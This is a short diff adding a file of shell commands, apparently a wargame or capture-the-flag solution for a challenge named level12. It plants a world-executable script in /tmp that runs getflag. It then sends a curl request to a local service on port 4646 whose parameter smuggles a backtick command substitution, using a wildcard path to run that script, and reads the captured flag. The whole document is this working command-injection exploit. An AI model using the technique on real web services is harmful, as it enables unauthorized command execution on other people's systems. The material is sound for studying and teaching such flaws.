@@ -1,0 +1,9 @@
+> ls -al
+
+> cat level12.pl
+
+> echo "getflag > /tmp/flag" > /tmp/F
+> chmod 777 /tmp/F
+
+> curl 127.0.0.1:4646?x=`/*/F`'
+> cat /tmp/flag
